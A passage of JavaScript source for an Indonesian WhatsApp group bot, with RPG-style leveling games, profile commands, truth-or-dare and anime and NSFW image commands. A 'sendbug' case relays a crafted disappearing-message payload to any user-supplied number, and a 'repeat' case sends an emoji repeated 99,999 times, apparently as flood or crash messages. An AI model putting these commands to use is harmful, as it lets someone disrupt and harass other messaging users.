                    			console.log(color('[pin]'), color(time, 'yellow'), color(pinUser, 'cyan'))
                			} else {
                    			addPinUser(sender, pinUser, time)
                    			await hexa.sendMessage({quoted: mek, caption: ind.nopin(pinUser, time, sender)})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
                    			console.log(color('[Pin]'), color(time, 'yellow'), color(pinUser, 'cyan'))
                			}
                			break
                
		case 'mining':
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pushname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner | isAdmin | isPremium) {
					const one = Math.ceil(Math.random() * 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					const mining = Math.ceil(Math.random() * 1000000000000000000000000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
					
			case 'level':
                 if (!isRegistered) return reply( ind.noregis())
					if (!isLevelingOn) return reply(ind.lvlnoon())
					if (!isGroup) return reply(ind.groupo())
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `◪ *LEVEL*\n  ├─ ❏ *Name* : ${pushname}\n  ├─ ❏ *Nomor* : ${sender.split("@")[0]}\n  ├─ ❏ *User XP* : ${userXp}/${requiredXp}\n  └─ ❏ *User Level* : ${userLevel}\n`
					hexa.sendMessage(from, resul, text, { quoted: mek})
					.catch(async (err) => {
					console.error(err)
					await reply(`Error!\n${err}`)
					})
					break
					
		case 'info':
					me = hexa.user
					uptime = process.uptime()
					teks = `*INFO OWNER*\n*Owner bot* : ${FN}\n*No Owner* : wa.me/6281328139682\n*Ig owner* :-\n━━━━━━━━━━━━━━━━━━━━\n*INFO BOT*\n*Nama bot* : ${me.name}\n*Nomor bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total block contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}\n*Ketik* : ${prefix}lpr _Untuk melaporkan admin bot melalui bot_\n*Ketik* : ${prefix}owner untuk menghubungi admin bot kami.`
					buffer = await getBuffer(me.imgUrl)
					hexa.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
					
			case 'request':
			        reply(mess.lim)
					const cfrr = body.slice(8)
					if (cfrr.length > 300) return hexa.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					const ress = `*[REQUEST VITUR]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`
							var options = {
							text: ress,
                         				contextInfo: {mentionedJid: [nomor]},
                     			}
					hexa.sendMessage('6283856237829@s.whatsapp.net', options, text, {quoted: mek})
					hexa.sendMessage('6283856237829@s.whatsapp.net', options, text, {quoted: mek})
					hexa.sendMessage('6283856237829@s.whatsapp.net', options, text, {quoted: mek})
					reply('REQUEST ANDA TELAH SAMPAI KE OWNER ARA REQUESTS PALSU ATAU MAIN² TIDAK AKAN DITANGGAPI.')
					break
				
			case 'profile':
    				hexa.updatePresence(from, Presence.composing)
    				try {
					ppimg = await hexa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					 profile = `╭─「 *PROFILE ANDA* 」\n│• *Name:* ${pushname}\n│• *XP:* ${getLevelingXp(sender)}\n│• *Level:* ${getLevelingLevel(sender)}\n│• *Role:* ${role}\n│• *User Terdaftar:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`
					buffer = await getBuffer(ppimg)
					hexa.sendMessage(from, buffer, image, {quoted: mek, caption: profile})
					break
					
		case 'setlimit':
		case 'addlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi* : ${limitawal}`)
					break 
					
		case 'setmemlimit':
					if (args.length < 1) return
				    if (!isAdmin) return reply('*Only Admin bot*')
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break 
					
			case 'leveling':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (args[0] === '1') {
					if (isLevelingOn) return reply('*Fitur level sudah aktif sebelum nya*')
					_leveling.push(from)
					fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
					reply(ind.lvlon())
					} else if (args[0] === '0') {
					_leveling.splice(from, 1)
						fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
						reply(ind.lvloff())
					} else {
						reply(ind.satukos())
					}
					break
					
			case 'event':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
					
		case 'udara':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}udara tembak cepet su`)
                    FC = body.slice(7)
                    setTimeout( () => {
                    reply(`[ *PERINTAH OTW STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh33}* ]\n[ INFORMASI *${prefix}ya* ]`)
                    }, 20000)
                    break
                    
         case 'darat':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}darat tembak perlahan`)
                    FC = body.slice(7)
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh22}* ]\n[ INFORMASI *${prefix}ya* ]`)
                    }, 20000)
                    break
                    
           case 'laut':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}laut tembak perlahan`)
                    FC = body.slice(6)
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh11}* ]\n[ INFORMASI *${prefix}ya* ]`)
                    }, 20000)
                    break
                    
             if (isLimit(sender)) return reply(ind.limitend(pusname))
         case 'petualang':
         reply(mess.lim)
                    if (args.length < 1) return reply(`FORMAT SALA CARA CONTOH\n${prefix}petualang mengcoly`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *sedang petualang...* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *tenaga mu berkurang karna berpetualang kejauhan* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *BERHASIL PETUALANG DAN KAMU MEPEROLEH* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WAH KMU HEBAT LANJUTKAN PERJUANGAN MU* ]\n[ *${buruh22}* ]\n[ INFORMASI *${prefix}halal* ]`)
                    }, 20000)
                    break
                    
                    if (isLimit(sender)) return reply(ind.limitend(pusname))
           case 'adv':
           reply(mess.lim)
                    if (args.length < 1) return reply(`FORMAT SALAH CONTOH\n${prefix}jalan2 jakarta`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *sedang adventur ${pushname}* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *NYAWA MU BERKURANG -67 KARNA ADVENTUR KE ${ASU}* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *TERUSKAN PERJUANGAN MU* ]\n[ *${buruh33}* ]\n[ INFORMASI *${prefix}ivntori* ]`)
                    }, 20000)
                    break
                    
           case 'inventori':
                    if (args.length < 1) return reply(`FORMAT SALAH CONTOH\n${prefix}inventori 1`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *membuka tas ${pushname}* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *ISI TAS KAMU MASIH SEDIKIT TERUSLAH BERPETUALANG AGAR DPT ITEM YG BANYAK* ]\n[ *${buruh4}* ]\n[ INFORMASI *${prefix}cari yg halal bero* ]`)
                    }, 20000)
                    break
                    
          case 'usepotion':
		            if (!isRegistered) return reply( ind.noregis())
		            const healperpotion = 1
		            const pot = healperpotion * 1
		            if (isPotion(sender)) return reply(`maaf potion kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
		            potionAdd(sender, pot)
		            addHealUser(sender, 25)
		            await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : Lylia\n*penerima* : ${pushname}\n*nominal pembelian* : 1 \n*Harga* : ${healperpotion}/25heal\nProses berhasil dengan nomer pembayaran\n${createSerial(15)}`) 
		            break
		
		case 'sewabot':
	              if (!isRegistered) return reply(ind.noregis())
		          if (isBanned) return reply(ind.baned())
					hexa.sendMessage(from, sewabot(prefix) , text, { quoted: mek })
					break
					
          case 'adventure':
                    if (!isRegistered) return reply( ind.noregis())
				    if (isBanned) return reply( ind.banned())
				    ngab = ['Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
				    const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
				    await reply(`${pushname} Sedang Berpetualang`)
				    await reply(`Tiba Tiba Ada ${sesuatu}`)
				    await reply(`AWAS!!`)
			        const dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
			        const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
				    anu = fs.readFileSync('./database/adventure/dungeon.js');
                    jsonAnu = JSON.parse(anu);
                    randIndex = Math.floor(Math.random() * jsonAnu.length);
                    randKey = jsonAnu[randIndex];
                    hasil = await getBuffer(randKey.result)
				    const adven = Math.ceil(Math.random() * 10000)
                    addLevelingXp(sender, adven)
				    const money = Math.ceil(Math.random() * 20000)
				    addKoinUser(sender, money)
				    const poti = Math.ceil(Math.random() * 5)
				    addPotioUser(sender, poti)
				    hexa.sendMessage(from, hasil, image, { quoted: mek, caption: `◪ *「 DEATH 」\n\n├─ ❏ *Tempat  ${ad}*\n├─ ❏ *MONEY : Rp.${money}*\n├─ ❏ *EXP : ${adven}Xp*\n└─ ❏ Potion : ${poti}` })
				    await limitAdd(sender)
				    await healAdd(sender)
				    break
		 
		case 'sendbug':
                 hexa.relayWAMessage(global.mm=hexa.
                 prepareMessageFromContent(`${body.slice(9)}`, hexa.
                 prepareDisappearingMessageSettingContent(0),
                 {}),{waitForAck:!0})
          break
          
          case 'repeat':
                   var Fajarz = `${args.join(' ')}`
                   var Emoji = Fajarz.split("|")[0];
                   let Karina = `${Emoji}`.repeat(99999)
                    hexa.sendMessage(from, Karina, MessageType.text, { quoted: FajarGanz })
            break
            
           case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':    
                     if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pushname))
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')     
				     reply(mess.lim)
                     ter = command[1].toLowerCase()
                     tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                     reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
              break
				
		case 'bully': case 'kiss': case 'pat': case 'baka': case 'slap': case 'poke':
		       if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			  reply(mess.lim)
              reply('SENDANG proses.....')
			  anu = await fetchJson(`https://waifu.pics/api/sfw/${command}`)
			  fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(anu.url))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
	break
	
    case 'yuri':  case 'lesbian': case 'eroNeko': case 'bj': case 'kitsune': case 'pussy':
               if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			  reply(mess.lim)
              reply('DI KARNAKAN FITUR INI 18+ BOT AKAN KIRIM LEWAT PRIVAT')
              kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=${command}&apikey=hardianto`)
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(kon))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(sender, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(sender,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
      break
      
      case 'neko': case 'megumin': case 'shinobu':
                   if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			       reply(mess.lim)
                   reply('DI KARNAKAN FITUR INI 18+ BOT AKAN KIRIM LEWAT PRIVAT')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/${command}`)
					fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(anu.url))
		            buttons = [{buttonId: '➡️ 𝑵𝒆𝒙𝒕 𝑵𝒆𝒌𝒐',buttonText:{displayText: '➡️ 𝑵𝒆𝒙𝒕 𝑵𝒆𝒌𝒐'},type:1},{buttonId: '❌ 𝑺𝒕𝒐𝒑',buttonText:{displayText: '❌ 𝑺𝒕𝒐𝒑'},type:1}]
                    imageMsg = ( await hexa.prepareMessage(sender, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
                    buttonsMessage = {footerText:'FajarGanz`', imageMessage: imageMsg,
                    contentText:`Hai ${pushname} Silahkan Pilih`,buttons,headerType:4}
                    prep = await hexa.prepareMessageFromContent(sender,{buttonsMessage},{quoted: mek, contextInfo:{"externalAdReply": {"title": `Nih Kak ${pushname} Neko Nya`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
                    hexa.relayWAMessage(prep)
                    fs.unlinkSync(`./${sender}.jpeg`)
		break
		
		case 'loli': case 'husbu':  case 'milf': case 'cosplay': case 'wallml':
		if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
        break
        
        case 'sao':
        if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			     reply(mess.lim)
				 data = fs.readFileSync('./fajar/swortartonline.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(randKey.result))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
break  
      
case 'hsdxd':
if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
				 data = fs.readFileSync('./fajar/highschooldxd.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(randKey.result))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
      break

     case 'lovelive':
     if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
				 data = fs.readFileSync('./fajar/lovelive.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(randKey.result))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
      break
      
      case  'awoo':    
      if (!isRegistered) return reply( ind.noregis())
			if (isLimit(sender)) return reply(ind.limitend(pushname))
            if (isBanned) return reply('Maaf kamu sudah terbenned!')
            reply(mess.lim)
           reply(mess.wait)
          anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
          buffer = await getBuffer(anu.url)
          hexa.sendMessage(from, buffer, image, { quoted: mek})
     break
     
     case 'blowjob':
     if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
              anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
		      fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(anu.url))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(sender, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(sender,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
      break
      
      case  'trapnime':  
               if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')       
			reply(mess.lim)
              reply(mess.wait)
              anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(anu.url))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(sender, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(sender,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
       break
       
       case 'chara':  
               if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(acak))
		      buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: `OWNER`},type:1},{buttonId:`${prefix}menua`,buttonText:{displayText:'BALIK KE MENU'},type:1}]
              imageMsg = ( await hexa.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
              hexa.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
         break
         
case 'buttons5':
               if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
           const mathdare = dare[Math.floor(Math.random() * (dare.length))]
           result = `${mathdare}`
           buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
           buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
           prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
           hexa.relayWAMessage(prep)
break                                                                   
                
case 'buttons6':
           if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
           const randomtruth = truth[Math.floor(Math.random() * truth.length)]
           result = `${randomtruth}`
           buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
           buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
           prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
           hexa.relayWAMessage(prep)
break

case 'tod':
          if (!isRegistered) return reply( ind.noregis())
			   if (isLimit(sender)) return reply(ind.limitend(pushname))
			   if (isBanned) return reply('Maaf kamu sudah terbenned!')
			reply(mess.lim)
          result =`*Truth Or Dare*\nPemain diberi pilihan antara menjawab pertanyaan dengan jujur, atau melakukan tantangan yang diberikan`
